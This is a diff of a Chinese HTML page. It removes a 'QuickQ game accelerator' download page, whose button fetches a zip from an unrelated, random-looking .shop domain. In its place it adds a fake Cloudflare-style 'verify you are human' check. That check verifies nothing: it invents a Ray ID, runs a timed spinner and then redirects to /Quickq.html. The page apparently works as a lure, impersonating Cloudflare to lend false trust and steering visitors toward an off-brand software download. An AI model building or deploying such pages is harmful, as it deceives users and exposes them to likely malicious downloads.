@@ -2,288 +2,575 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>欢迎进入QuickQ</title>
-      <script type="text/javascript">
-window._agl = window._agl || [];
-(function () {
-_agl.push(
-['production', '_f7L2XwGXjyszb4d1e2oxPybgD']
-);
-(function () {
-var agl = document.createElement('script');
-agl.type = 'text/javascript';
-agl.async = true;
-agl.src = 'https://fxgate.baidu.com/angelia/fcagl.js?production=_f7L2XwGXjyszb4d1e2oxPybgD';
-var s = document.getElementsByTagName('script')[0];
-s.parentNode.insertBefore(agl, s);
-})();
-})();
-</script>
-<style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
-html, body {
-  width: 100%;
-  height: 100%;
-  font-family: -apple-system, BlinkMacSystemFont, Inter, Segoe UI, Roboto, sans-serif;
-}
-body {
-  background: #f5f5f5;
-  color: #001d2f;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>人机验证</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-.html_main {
-  position: relative;
-  width: 100%;
-  min-height: 100vh;
-  background: url(../images/bg.png) center center / cover no-repeat;
-}
+        body {
+            background: linear-gradient(145deg, #f0f2f5 0%, #e6e9ef 100%);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            position: relative;
+        }
 
-.html_header {
-  position: fixed;
-  top: 0;
-  left: 0;
-  right: 0;
-  z-index: 99;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  padding: 20px 40px;
-  background: rgba(255,255,255,0.92);
-}
+        /* 背景装饰 - 云朵/网格效果 */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(circle at 10% 20%, rgba(255,255,255,0.4) 2%, transparent 2.5%),
+                              radial-gradient(circle at 85% 70%, rgba(60, 80, 120, 0.08) 3%, transparent 3.5%);
+            background-size: 48px 48px, 70px 70px;
+            pointer-events: none;
+            z-index: 0;
+        }
 
-.logo-img {
-  height: 70px;
-  width: auto;
-  display: block;
-}
-.right .language {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  font-size: 16px;
-  color: #999;
-  cursor: pointer;
-}
-.language img {
-  width: 24px;
-}
+        /* 主卡片 - Cloudflare 风格 */
+        .verification-card {
+            background: rgba(255, 255, 255, 0.96);
+            backdrop-filter: blur(0px);
+            border-radius: 36px;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25), 0 2px 6px rgba(0, 0, 0, 0.02);
+            width: 100%;
+            max-width: 480px;
+            padding: 32px 28px 38px;
+            transition: all 0.2s ease;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            z-index: 2;
+            position: relative;
+        }
 
-.html_content {
-  max-width: 1200px;
-  margin: 0 auto;
-  padding: 140px 20px 80px;
-}
-.wrap {
-  display: flex;
-  align-items: center;
-  gap: 40px;
-  margin-bottom: 60px;
-}
-.windows {
-  flex: 1;
-}
-.windows h3 {
-  font-size: 32px;
-  color: #1a1a1a;
-  margin-bottom: 16px;
-}
-.windows p {
-  font-size: 18px;
-  color: #333;
-  margin-bottom: 10px;
-}
+        /* 头部 Icon + 标题 */
+        .verification-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .shield-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #f6821f 0%, #f59e2e 100%);
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            margin-bottom: 18px;
+            box-shadow: 0 8px 18px rgba(245, 130, 31, 0.25);
+            transition: box-shadow 0.3s;
+        }
+        .shield-icon svg {
+            width: 34px;
+            height: 34px;
+            filter: drop-shadow(0 2px 2px rgba(0,0,0,0.1));
+        }
+        .verification-header h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1e293b;
+            letter-spacing: -0.3px;
+            margin-bottom: 8px;
+        }
+        .verification-header p {
+            font-size: 14px;
+            color: #5b6e8c;
+            font-weight: 450;
+        }
 
-.remarks {
-  margin: 30px 0;
-}
-.remarks_text {
-  margin-bottom: 16px;
-  display: flex;
-  align-items: center;
-  gap: 14px;
-}
-.remarks_text img {
-  width: 28px;
-  height: 28px;
-}
-.remarks_text p {
-  font-size: 17px;
-  color: #666;
-  margin: 0;
-}
+        /* 模拟Ray ID 和 状态栏 */
+        .cf-meta {
+            display: flex;
+            justify-content: space-between;
+            background: #f8fafc;
+            padding: 8px 14px;
+            border-radius: 60px;
+            font-size: 11px;
+            color: #4b5a75;
+            margin-bottom: 28px;
+            font-family: monospace;
+            border: 1px solid #eef2f6;
+        }
+        .cf-meta span:first-child {
+            letter-spacing: 0.2px;
+        }
+        .cf-meta span:last-child {
+            background: #eef3ff;
+            padding: 2px 8px;
+            border-radius: 30px;
+            color: #f6821f;
+            font-weight: 500;
+        }
 
-.download-btn {
-  display: inline-block;
-  width: 220px;
-  height: 60px;
-  line-height: 60px;
-  text-align: center;
-  background: #fea01a;
-  color: #fff;
-  border-radius: 12px;
-  font-size: 18px;
-  text-decoration: none;
-  cursor: pointer;
-}
-.download-btn:hover {
-  opacity: 0.9;
-}
+        /* 人机验证主区域 - 同一个区域完成验证 + 跳转 */
+        .captcha-widget {
+            background-color: #ffffff;
+            border-radius: 28px;
+            border: 1px solid #e2e8f0;
+            transition: all 0.2s;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
+            margin-bottom: 20px;
+        }
+        /* 可点击的验证/跳转区域 */
+        .verify-area {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 20px 22px;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+            border-radius: 28px;
+            background: #ffffff;
+            user-select: none;
+        }
+        .verify-area:hover:not(.disabled-global) {
+            background: #fefaf5;
+            border-color: #ffd7b5;
+        }
+        .verify-area:active:not(.disabled-global) {
+            transform: scale(0.99);
+        }
+        /* 左侧图标容器 */
+        .verify-icon {
+            width: 42px;
+            height: 42px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 34px;
+            flex-shrink: 0;
+            transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+        /* 旋转动画 */
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .spinner-animate {
+            display: inline-block;
+            animation: spin 0.8s linear infinite;
+            font-size: 32px;
+        }
 
-.demonstration {
-  flex: 1;
-  text-align: center;
-}
-.demonstration img {
-  max-height: 520px;
-  max-width: 100%;
-}
+        /* 右侧文本区 */
+        .verify-text {
+            flex: 1;
+        }
+        .verify-title {
+            font-weight: 600;
+            font-size: 18px;
+            color: #0f172a;
+            margin-bottom: 4px;
+        }
+        .verify-sub {
+            font-size: 12px;
+            color: #5d6f8f;
+            font-weight: 450;
+        }
+        /* 成功状态边框效果 */
+        .captcha-widget.success-border {
+            border-color: #2b9e5e;
+            box-shadow: 0 4px 14px rgba(43, 158, 94, 0.15);
+            background-color: #f6fef9;
+        }
 
-.system {
-  display: flex;
-  justify-content: space-around;
-  text-align: center;
-  margin-top: 40px;
-}
-.system_li img {
-  height: 100px;
-}
-.system_li p {
-  font-size: 16px;
-  color: #ccc;
-  margin-top: 8px;
-}
-.system_li .t {
-  color: #333;
-}
+        /* 状态提示条 */
+        .verification-message {
+            background: #f1f5f9;
+            border-radius: 20px;
+            padding: 12px 20px;
+            font-size: 13.5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #334155;
+            margin-top: 6px;
+            transition: all 0.2s;
+        }
+        .verification-message.success {
+            background: #e6f7ed;
+            color: #166534;
+        }
+        .verification-message.error {
+            background: #fee9e6;
+            color: #b91c1c;
+        }
+        .msg-icon {
+            font-size: 18px;
+        }
 
-.footer {
-  position: fixed;
-  bottom: 0;
-  left: 0;
-  right: 0;
-  background: #4d4d4d;
-  padding: 15px 0;
-  text-align: center;
-}
-.footer_text {
-  color: #ccc;
-  font-size: 14px;
-  line-height: 1.6;
-}
+        /* 重置链接 - 低调可用 */
+        .reset-link {
+            text-align: right;
+            margin-top: 20px;
+            font-size: 12px;
+        }
+        .reset-btn {
+            background: none;
+            border: none;
+            color: #6c7f9e;
+            font-size: 12px;
+            cursor: pointer;
+            text-decoration: underline;
+            transition: color 0.2s;
+            padding: 8px 6px;
+            border-radius: 40px;
+            font-weight: 450;
+        }
+        .reset-btn:hover {
+            color: #f6821f;
+            background: rgba(246, 130, 31, 0.05);
+        }
 
-.animation {
-  animation: fadeIn 0.6s ease forwards;
-}
-@keyframes fadeIn {
-  from { opacity: 0; transform: translateY(20px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-</style>
+        /* 底部信息 */
+        .footer-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 10px;
+            color: #94a3b8;
+            border-top: 1px solid #edf2f7;
+            padding-top: 18px;
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+        .footer-note span {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* 禁用全局点击的外加样式 */
+        .verify-area.disabled-global {
+            cursor: default;
+            opacity: 0.9;
+            background: #fafcff;
+        }
+        .verify-area.disabled-global:hover {
+            background: #fafcff;
+            transform: none;
+        }
+
+        @media (max-width: 500px) {
+            .verification-card {
+                padding: 24px 20px 30px;
+            }
+            .verify-area {
+                padding: 16px 18px;
+            }
+            .verify-title {
+                font-size: 16px;
+            }
+        }
+    </style>
 </head>
-
 <body>
-<div class="html_main">
-  <div class="html_header">
-    <img src="./accset/logo.png" alt="Logo" class="logo-img">
-
-    <div class="right">
-      <div class="language">
-        <div class="lang">
-          <img src="./accset/lang.png">
-          <span>简体中文</span>
+<div class="verification-card">
+    <div class="verification-header">
+        <div class="shield-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L3 7L12 12L21 7L12 2Z" stroke="white" stroke-width="1.5" stroke-linejoin="round" fill="none"/>
+                <path d="M3 12L12 17L21 12" stroke="white" stroke-width="1.5" stroke-linejoin="round" fill="none"/>
+                <path d="M3 17L12 22L21 17" stroke="white" stroke-width="1.5" stroke-linejoin="round" fill="none"/>
+                <path d="M12 12V22" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
+                <path d="M7.5 9.5L12 12L16.5 9.5" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
         </div>
-      </div>
+        <h2>验证您是人类</h2>
+        <p>为确保连接安全，请完成下方验证</p>
     </div>
-  </div>
 
-  <div class="html_content">
-    <div class="wrap">
-      <div class="windows">
-        <h3 class="animation">游戏加速器</h3>
-        <p class="animation">最新版本: 108</p>
-        <p class="animation">支持 window 7/8/10/11</p>
+    <!-- Cloudflare 元数据装饰 -->
+    <div class="cf-meta">
+        <span>🌐 连接安全 • Ray ID: <span id="rayId">7f3b2c1a-9e4d</span></span>
+        <span>🔒 SSL 加密</span>
+    </div>
 
-        <div class="remarks animation">
-          <div class="remarks_text">
-            <img src="./accset/icon.png">
-            <p>一键连接，无需手动配置</p>
-          </div>
-          <div class="remarks_text">
-            <img src="./accset/icon.png">
-            <p>多个游戏线路供你选择</p>
-          </div>
-          <div class="remarks_text">
-            <img src="./accset/icon.png">
-            <p>流量加密，零日志政策</p>
-          </div>
-          <div class="remarks_text">
-            <img src="./accset/icon.png">
-            <p>7*18小时客服支持</p>
-          </div>
+    <!-- 人机交互组件 (同一个区域完成验证+跳转) -->
+    <div class="captcha-widget" id="captchaWidget">
+        <div class="verify-area" id="verifyArea">
+            <div class="verify-icon" id="verifyIcon">
+                <span id="iconSpan">☐</span>
+            </div>
+            <div class="verify-text">
+                <div class="verify-title" id="verifyTitle">我不是机器人</div>
+                <div class="verify-sub" id="verifySub">点击验证，通过人机检查</div>
+            </div>
         </div>
-
-        <a href="javascript:;" class="download-btn animation download-app" data-agl-cvt="6">立即下载</a>
-      </div>
-
-      <div class="demonstration animation">
-        <img src="./accset/1657012377344113.jpg">
-      </div>
     </div>
 
-    <div class="system">
-      <div class="system_li">
-        <img src="./accset/download_ios.png">
-        <p>iPhone/iPad</p>
-      </div>
-      <div class="system_li">
-        <img src="./accset/download_android.png">
-        <p>Android</p>
-      </div>
-      <div class="system_li">
-        <img src="./accset/download_windows.png">
-        <p class="t">Windows</p>
-      </div>
-      <div class="system_li">
-        <img src="./accset/download_mac.png">
-        <p>Mac</p>
-      </div>
-      <div class="system_li">
-        <img src="./accset/download_linux.png">
-        <p>Linux</p>
-      </div>
+    <!-- 动态消息区域 -->
+    <div class="verification-message" id="statusMsg">
+        <span class="msg-icon">🛡️</span>
+        <span id="msgText">等待验证 • 点击上方区域验证身份</span>
     </div>
-  </div>
 
-  <div class="footer">
-    <div class="footer_text">
-      Copyright 2018-2022 quickq游戏加速器<br>
-      开发者名称：APP/游戏加速器 更新时间：2026-4-11 版本号：版本3.2.32 |
-      <a href="/" target="_blank" style="color:#ccc">用户协议</a> |
-      <a href="/" target="_blank" style="color:#ccc">隐私协议</a>
+    <!-- 重置按钮 -->
+    <div class="reset-link">
+        <button class="reset-btn" id="resetBtn">↻ 重置验证 (可重新体验)</button>
     </div>
-  </div>
+
+    <div class="footer-note">
+        <span>⚡ Cloudflare 安全防护</span>
+        <span>✓ 隐私保护验证</span>
+    </div>
 </div>
 
 <script>
-window.downloadURL = 'https://msntnisnsoitnah.shop/mtnusb/Winde-Quickq6.022.7.8.zip';
+    // 状态管理
+    let currentState = 'unverified'; // unverified, verifying, success
+    let verifyTimeout = null;         // 模拟验证异步定时器
 
-document.querySelectorAll('.download-app').forEach(link => {
-  link.onclick = function(e){
-    e.preventDefault();
-    let a = document.createElement('a');
-    a.href = window.downloadURL;
-    a.download = 'Qk.zip';
-    document.body.appendChild(a);
-    a.click();
-    document.body.removeChild(a);
-  }
-});
+    // DOM 元素
+    const verifyArea = document.getElementById('verifyArea');
+    const captchaWidget = document.getElementById('captchaWidget');
+    const iconSpan = document.getElementById('iconSpan');
+    const verifyTitle = document.getElementById('verifyTitle');
+    const verifySub = document.getElementById('verifySub');
+    const statusMsgDiv = document.getElementById('statusMsg');
+    const msgTextSpan = document.getElementById('msgText');
+    const resetBtn = document.getElementById('resetBtn');
+    const rayIdSpan = document.getElementById('rayId');
+
+    // 随机生成 Ray ID (装饰)
+    function randomRayId() {
+        const chars = '0123456789abcdef';
+        let id = '7f';
+        for(let i = 0; i < 8; i++) id += chars[Math.floor(Math.random() * chars.length)];
+        id += '-';
+        for(let i = 0; i < 4; i++) id += chars[Math.floor(Math.random() * chars.length)];
+        return id;
+    }
+    rayIdSpan.textContent = randomRayId();
+
+    // 清除验证计时器
+    function clearVerificationTimer() {
+        if (verifyTimeout) {
+            clearTimeout(verifyTimeout);
+            verifyTimeout = null;
+        }
+    }
+
+    // 更新UI: 根据状态改变图标、文字、样式以及区域的可点击行为
+    function updateUI() {
+        if (currentState === 'unverified') {
+            iconSpan.innerHTML = '☐';
+            iconSpan.style.fontSize = '34px';
+            iconSpan.style.color = '#64748b';
+            iconSpan.classList.remove('spinner-animate');
+            verifyTitle.innerText = '我不是机器人';
+            verifySub.innerText = '点击验证，通过人机检查';
+            captchaWidget.classList.remove('success-border');
+            statusMsgDiv.classList.remove('success', 'error');
+            statusMsgDiv.style.background = '#f1f5f9';
+            msgTextSpan.innerText = '等待验证 • 点击上方区域验证身份';
+            // 移除全局禁用样式，允许点击（用于开始验证）
+            verifyArea.classList.remove('disabled-global');
+            verifyArea.style.cursor = 'pointer';
+            // 保留pointer events auto
+            verifyArea.style.pointerEvents = 'auto';
+        } 
+        else if (currentState === 'verifying') {
+            iconSpan.innerHTML = '⟳';
+            iconSpan.style.fontSize = '34px';
+            iconSpan.style.color = '#f6821f';
+            iconSpan.classList.add('spinner-animate');
+            verifyTitle.innerText = '验证中...';
+            verifySub.innerText = '正在检查环境安全性，请稍后';
+            captchaWidget.classList.remove('success-border');
+            statusMsgDiv.classList.remove('success', 'error');
+            statusMsgDiv.style.background = '#fff2e5';
+            msgTextSpan.innerText = '⏳ 正在验证请求，请稍等...';
+            // 验证中禁用点击，防止重复触发
+            verifyArea.classList.add('disabled-global');
+            verifyArea.style.pointerEvents = 'none';
+        } 
+        else if (currentState === 'success') {
+            iconSpan.innerHTML = '✓';
+            iconSpan.style.fontSize = '36px';
+            iconSpan.style.color = '#2b9e5e';
+            iconSpan.classList.remove('spinner-animate');
+            verifyTitle.innerText = '✓ 验证成功';
+            verifySub.innerText = '点击此区域继续访问 首页 →';
+            captchaWidget.classList.add('success-border');
+            statusMsgDiv.classList.add('success');
+            statusMsgDiv.style.background = '#e6f7ed';
+            msgTextSpan.innerHTML = '✅ 验证通过！请再次点击同一区域跳转到目标页面。';
+            // 验证成功后，移除禁用样式，让用户可以再次点击进行跳转
+            verifyArea.classList.remove('disabled-global');
+            verifyArea.style.pointerEvents = 'auto';
+            verifyArea.style.cursor = 'pointer';
+        }
+    }
+
+    // 执行跳转逻辑 (只会在 success 状态下触发)
+    function redirectToPage() {
+        if (currentState === 'success') {
+            // 增加微小的视觉反馈，再跳转，提升体验
+            verifyArea.style.transform = 'scale(0.98)';
+            setTimeout(() => {
+                //ks跳转页面
+                window.location.href = '/Quickq.html';
+            }, 80);
+        } else {
+            // 理论上不应该进入，但如果因为异步问题调用，给出警告
+            console.warn('状态不是success，无法跳转');
+            if (currentState !== 'success') {
+                msgTextSpan.innerHTML = '⚠️ 请先完成人机验证再点击跳转区域';
+                statusMsgDiv.classList.add('error');
+                statusMsgDiv.style.background = '#fee9e6';
+                setTimeout(() => {
+                    if (currentState !== 'success') {
+                        if (currentState === 'unverified') {
+                            msgTextSpan.innerHTML = '等待验证 • 点击上方区域验证身份';
+                        } else if (currentState === 'verifying') {
+                            msgTextSpan.innerHTML = '⏳ 正在验证请求，请稍等...';
+                        }
+                        statusMsgDiv.classList.remove('error');
+                        if (currentState === 'unverified') statusMsgDiv.style.background = '#f1f5f9';
+                        else if (currentState === 'verifying') statusMsgDiv.style.background = '#fff2e5';
+                    } else {
+                        // 如果已经变成 success 则显示正常跳转消息
+                        if (currentState === 'success') {
+                            msgTextSpan.innerHTML = '✅ 验证通过！请再次点击同一区域跳转到目标页面。';
+                            statusMsgDiv.classList.remove('error');
+                            statusMsgDiv.style.background = '#e6f7ed';
+                        }
+                    }
+                }, 1800);
+            }
+        }
+    }
+
+    // 开始人机验证（模拟异步校验）
+    function startVerification() {
+        if (currentState !== 'unverified') return;
+
+        // 切换到验证中
+        currentState = 'verifying';
+        updateUI();
+
+        // 模拟网络请求延迟 (600~1200ms)
+        clearVerificationTimer();
+        verifyTimeout = setTimeout(() => {
+            // 防止在等待过程中被重置导致状态变化
+            if (currentState === 'verifying') {
+                // 验证成功
+                currentState = 'success';
+                updateUI();
+                // 额外加一个成功的微动效（震动提示）
+                captchaWidget.style.transform = 'scale(1.01)';
+                setTimeout(() => {
+                    if (captchaWidget) captchaWidget.style.transform = '';
+                }, 180);
+                console.log('✅ 人机验证成功 — 现在可以再次点击同一区域跳转至 2.html');
+            }
+            verifyTimeout = null;
+        }, 700 + Math.random() * 500); // 650ms~1150ms
+    }
+
+    // 重置整个验证组件：清除状态、计时器、回到未验证
+    function resetVerification() {
+        // 清除模拟验证定时器
+        clearVerificationTimer();
+        // 重置状态到未验证
+        const wasSuccess = (currentState === 'success');
+        currentState = 'unverified';
+        updateUI();
+        // 确保点击区域完全恢复
+        verifyArea.classList.remove('disabled-global');
+        verifyArea.style.pointerEvents = 'auto';
+        verifyArea.style.cursor = 'pointer';
+        verifyArea.style.transform = '';
+        // 重置Ray ID，增加真实感
+        rayIdSpan.textContent = randomRayId();
+        // 短暂提示重置完成
+        statusMsgDiv.classList.remove('success', 'error');
+        statusMsgDiv.style.background = '#f1f5f9';
+        msgTextSpan.innerHTML = '🔄 重置成功 • 可重新进行验证与跳转';
+        setTimeout(() => {
+            if (currentState === 'unverified' && msgTextSpan.innerHTML === '🔄 重置成功 • 可重新进行验证与跳转') {
+                msgTextSpan.innerHTML = '等待验证 • 点击上方区域验证身份';
+            }
+        }, 1600);
+        captchaWidget.classList.remove('success-border');
+        console.log('🔄 重置完成，再次点击即可开始验证');
+    }
+
+    // 主区域点击事件: 根据状态决定做什么
+    function onMainAreaClick(e) {
+        e.stopPropagation();
+        if (currentState === 'unverified') {
+            // 未验证 -> 开始验证流程
+            startVerification();
+        } 
+        else if (currentState === 'success') {
+            // 已验证成功 -> 执行跳转
+            redirectToPage();
+        }
+        else if (currentState === 'verifying') {
+            // 验证中，给用户反馈不可点击
+            statusMsgDiv.classList.add('error');
+            statusMsgDiv.style.background = '#fff0ed';
+            const originalMsg = msgTextSpan.innerHTML;
+            msgTextSpan.innerHTML = '⏳ 验证处理中，请稍后...';
+            setTimeout(() => {
+                if (currentState === 'verifying') {
+                    statusMsgDiv.style.background = '#fff2e5';
+                    msgTextSpan.innerHTML = '⏳ 正在验证请求，请稍等...';
+                    statusMsgDiv.classList.remove('error');
+                } else if (currentState === 'success') {
+                    if (msgTextSpan.innerHTML !== '✅ 验证通过！请再次点击同一区域跳转到目标页面。') {
+                        msgTextSpan.innerHTML = '✅ 验证通过！请再次点击同一区域跳转到目标页面。';
+                        statusMsgDiv.classList.remove('error');
+                        statusMsgDiv.style.background = '#e6f7ed';
+                    }
+                } else if (currentState === 'unverified') {
+                    statusMsgDiv.style.background = '#f1f5f9';
+                    msgTextSpan.innerHTML = '等待验证 • 点击上方区域验证身份';
+                    statusMsgDiv.classList.remove('error');
+                }
+            }, 1000);
+        }
+    }
+
+    // 绑定重置按钮事件
+    resetBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        resetVerification();
+    });
+
+    // 绑定主验证区域的点击事件
+    verifyArea.addEventListener('click', onMainAreaClick);
+
+    // 页面初始加载
+    window.addEventListener('load', () => {
+        currentState = 'unverified';
+        updateUI();
+        console.log("✨ Cloudflare 风格人机验证 | 同一区域两次点击：第一次验证 → 第二次跳转 2.html");
+    });
+
+    // 额外装饰：动态盾牌阴影效果
+    const shieldEl = document.querySelector('.shield-icon');
+    if (shieldEl) {
+        setInterval(() => {
+            if (currentState === 'success') {
+                shieldEl.style.boxShadow = '0 8px 20px rgba(43, 158, 94, 0.45)';
+            } else {
+                shieldEl.style.boxShadow = '0 8px 18px rgba(245, 130, 31, 0.25)';
+            }
+        }, 700);
+    }
 </script>
 </body>
 </html>
